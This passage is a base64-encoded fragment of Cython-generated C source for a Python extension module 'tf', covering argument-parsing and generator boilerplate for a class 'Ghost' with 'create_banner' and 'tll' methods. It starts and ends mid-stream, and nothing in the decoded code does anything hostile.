dzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjcmVhdGVfYmFubmVyIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoImNyZWF0ZV9iYW5uZXIiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY3JlYXRlX2Jhbm5lciIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuY3JlYXRlX2Jhbm5lciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMnRmXzVHaG9zdF84Y3JlYXRlX2Jhbm5lcihfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfOGNyZWF0ZV9iYW5uZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9zZWxmKSB7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMyA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfNDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjcmVhdGVfYmFubmVyIiwgMCk7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNCA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDEtX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDg3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5jcmVhdGVfYmFubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfMTF0bGwoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzExdGxsID0geyJ0bGwiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJ0Zl81R2hvc3RfMTF0bGwsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8xMXRsbChQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJ0bGwgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgInRsbCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJ0bGwiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDg5LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgidGxsIiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfMTB0bGwoX19weXhfc2VsZiwgX19weXhfdl9zZWxmKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJ0Zl81R2hvc3RfM3RsbF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydGZfNUdob3N0XzN0bGxfZ2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfdHBfbmV3XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7CiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilQeV9Ob25lKTsKICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICAgIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X291dGVyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopIF9fcHl4X3NlbGY7CiAgX19QeXhfSU5DUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZS0+X19weXhfb3V0ZXJfc2NvcGUpOwogIF9fUHl4X0dJVkVSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlLT5fX3B5eF9vdXRlcl9zY29wZSk7CiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDsKICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8ydGZfNUdob3N0XzN0bGxfMmdlbmVyYXRvciwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90Zik7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9jdXJfc2NvcGUpOwogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gKFB5T2JqZWN0ICopIGdlbjsKICB9CgogIAogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMnRmXzVHaG9zdF8zdGxsXzJnZW5lcmF0b3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeU9iamVjdCAqKCpfX3B5eF90XzMpKFB5T2JqZWN0ICopOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90Xzg7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgc3dpdGNoIChfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCkgewogICAgY2FzZSAwOiBnb3RvIF9fcHl4X0wzX2ZpcnN0X3J1bjsKICAgIGRlZmF1bHQ6IAogICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICByZXR1cm4gTlVMTDsKICB9CiAgX19weXhfTDNfZmlyc3RfcnVuOjsKICBpZiAodW5saWtlbHkoIV9fcHl4X3NlbnRfdmFsdWUpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3IgPSBQeUxpc3RfTmV3KDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3IpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9yKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDkxLCBfX3B5eF9MMV9lcnJvcikgfQogIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsKICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMDsgX19QeXhfSU5DUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSAwOwogICAgX19weXhfdF8zID0gTlVMTDsKICB9IGVsc2UgewogICAgX19weXhfdF8yID0gLTE7IF9fcHl4X3RfMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzMgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5MSwgX19weXhfTDFfZXJyb3IpCiAgfQogIGZvciAoOzspIHsKICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHsKICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEpKSkgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgewogICAgICAgICAgUHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICBpZiAoX19weXhfdF8yID49IF9fcHl4X3RlbXApIGJyZWFrOwogICAgICAgIH0KICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9OZXdSZWYoUHlUdXBsZV9HRVRfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMikpOwogICAgICAgICNlbHNlCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTsKICAgICAgICAjZW5kaWYKICAgICAgICArK19fcHl4X3RfMjsKICAgICAgf